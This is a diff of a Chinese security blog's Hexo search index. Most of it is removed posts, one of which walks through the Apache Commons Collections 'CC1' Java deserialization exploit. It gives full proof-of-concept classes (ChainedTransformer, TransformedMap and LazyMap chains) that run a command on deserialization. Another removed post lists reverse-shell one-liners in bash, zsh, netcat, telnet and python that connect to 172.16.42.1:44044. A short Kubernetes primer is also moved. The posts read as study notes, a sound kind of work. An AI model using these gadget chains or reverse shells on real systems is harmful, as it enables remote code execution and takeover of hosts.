class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        transformerChain.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>上述poc有个问题就是服务端需要我们创建一个Runtime对象，我们不可能控制服务端。所以我们需要在数组中进行串行调用。</p>
-<p>先获取Runtime对象，再通过Runtime对象执行方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>那么如果我们反序列化呢</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//new ConstantTransformer(Runtime.getRuntime()),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>是会失败的，因为Runtime类没有继承Serializable，无法在服务端反序列化成功。</p>
-<p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<span class="comment">//得到Runtime class</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>最终的poc</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC0</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//1. 获取Runtime Class</span></span><br><span class="line">                <span class="comment">//new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;))</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h3 id="3-4-TransformedMap"><a href="#3-4-TransformedMap" class="headerlink" title="3.4 TransformedMap"></a>3.4 TransformedMap</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
-<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PocMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">        <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">        Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">        <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">        <span class="comment">//outerMap_now.put(&quot;123&quot;, &quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="4-LazyMap版本"><a href="#4-LazyMap版本" class="headerlink" title="4. LazyMap版本"></a>4. LazyMap版本</h2><p>jdk 8u72一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoclazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;ddddddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>对poc进行了简单分析，分别使用了TransformedMap版和lazyMpa进行了复现</p>
-<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ul>
-<li> <a href="https://shadowflow123.github.io/2021/12/15/Commons-Collections-1">https://shadowflow123.github.io/2021/12/15/Commons-Collections-1</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>java安全</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -753,6 +753,39 @@
       </tags>
   </entry>
   <entry>
+    <title>k8s基本概念</title>
+    <url>/Kubernetes%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[<blockquote>
+<p>天下皆知美之为美，斯恶已；皆知善之为善，斯不善已。</p>
+</blockquote>
+<p>掌握k8s基本概念</p>
+<span id="more"></span>
+
+<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>我们都经常使用docker，docker是对容器的封装。它极大的简化了系统的的构建和维护。使得 <code>Docker</code> 技术比虚拟机技术更为轻便、快捷。从而让容器技术应用越来越广泛。</p>
+<p>当容器变多了的时候，我们需要同一管理容器的平台，Kubernetes应运而生，Kubernetes是使用最为广泛的容器编排平台。</p>
+<h2 id="2-k8s架构"><a href="#2-k8s架构" class="headerlink" title="2. k8s架构"></a>2. k8s架构</h2><p><img src="../images/pic/k8s1.png"></p>
+<p><strong>Node：</strong></p>
+<p>我们可以把每个宿主机看成一个节点，每个节点又数个pod构成，pod由有一个或多个容器构成。</p>
+<p><strong>Master节点：</strong></p>
+<p>master节点是负责管理其他节点的主节点</p>
+<p><strong>pod:</strong></p>
+<p>一个pod相当于运行的一个应用或者服务</p>
+<p><strong>API Server:</strong></p>
+<p>通过API Server接口可以对集群进行管理</p>
+<p><strong>kubelet:</strong></p>
+<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
+<p><strong>etcd：</strong></p>
+<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
+<h2 id="3-k8s设计理念"><a href="#3-k8s设计理念" class="headerlink" title="3. k8s设计理念"></a>3. k8s设计理念</h2><p>k8s集群都是通过API的方式进行通讯，这也是分布式系统的设计理念。API都是遵循Restful API接口规范。</p>
+]]></content>
+      <categories>
+        <category>云原生安全</category>
+      </categories>
+      <tags>
+        <tag>Kubernetes</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>k8s环境构建</title>
     <url>/Kubernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<blockquote>
@@ -966,39 +999,6 @@
 
 
 
-]]></content>
-      <categories>
-        <category>云原生安全</category>
-      </categories>
-      <tags>
-        <tag>Kubernetes</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>k8s基本概念</title>
-    <url>/Kubernetes%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[<blockquote>
-<p>天下皆知美之为美，斯恶已；皆知善之为善，斯不善已。</p>
-</blockquote>
-<p>掌握k8s基本概念</p>
-<span id="more"></span>
-
-<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>我们都经常使用docker，docker是对容器的封装。它极大的简化了系统的的构建和维护。使得 <code>Docker</code> 技术比虚拟机技术更为轻便、快捷。从而让容器技术应用越来越广泛。</p>
-<p>当容器变多了的时候，我们需要同一管理容器的平台，Kubernetes应运而生，Kubernetes是使用最为广泛的容器编排平台。</p>
-<h2 id="2-k8s架构"><a href="#2-k8s架构" class="headerlink" title="2. k8s架构"></a>2. k8s架构</h2><p><img src="../images/pic/k8s1.png"></p>
-<p><strong>Node：</strong></p>
-<p>我们可以把每个宿主机看成一个节点，每个节点又数个pod构成，pod由有一个或多个容器构成。</p>
-<p><strong>Master节点：</strong></p>
-<p>master节点是负责管理其他节点的主节点</p>
-<p><strong>pod:</strong></p>
-<p>一个pod相当于运行的一个应用或者服务</p>
-<p><strong>API Server:</strong></p>
-<p>通过API Server接口可以对集群进行管理</p>
-<p><strong>kubelet:</strong></p>
-<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
-<p><strong>etcd：</strong></p>
-<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
-<h2 id="3-k8s设计理念"><a href="#3-k8s设计理念" class="headerlink" title="3. k8s设计理念"></a>3. k8s设计理念</h2><p>k8s集群都是通过API的方式进行通讯，这也是分布式系统的设计理念。API都是遵循Restful API接口规范。</p>
 ]]></content>
       <categories>
         <category>云原生安全</category>
@@ -1491,78 +1491,6 @@
       </tags>
   </entry>
   <entry>
-    <title>linux下反弹shell</title>
-    <url>/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[<blockquote>
-<p>桃李春风一杯酒，江湖夜雨十年灯。</p>
-</blockquote>
-<p>常见的一些linux反弹shell总结</p>
-<span id="more"></span>
-
-<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="zsh反弹"><a href="#zsh反弹" class="headerlink" title="zsh反弹"></a>zsh反弹</h2><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">靶机：zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 172.16.42.1 44044 &amp;&amp; zsh &gt;&amp;<span class="subst">$REPLY</span> 2&gt;&amp;<span class="subst">$REPLY</span> 0&gt;&amp;<span class="subst">$REPLY</span>&#x27;</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">44044</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="nc正向反弹"><a href="#nc正向反弹" class="headerlink" title="nc正向反弹"></a>nc正向反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：nc -lvp <span class="number">7777</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc <span class="number">172.16</span>.<span class="number">43.1</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">靶机: mknod <span class="keyword">a</span> p; telnet <span class="number">172.16</span><span class="number">.42</span><span class="number">.1</span> <span class="number">44044</span> <span class="number">0</span>&lt;<span class="keyword">a</span> | /bin/bash <span class="number">1</span>&gt;<span class="keyword">a</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">python -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.1&quot;</span>,<span class="number">44044</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
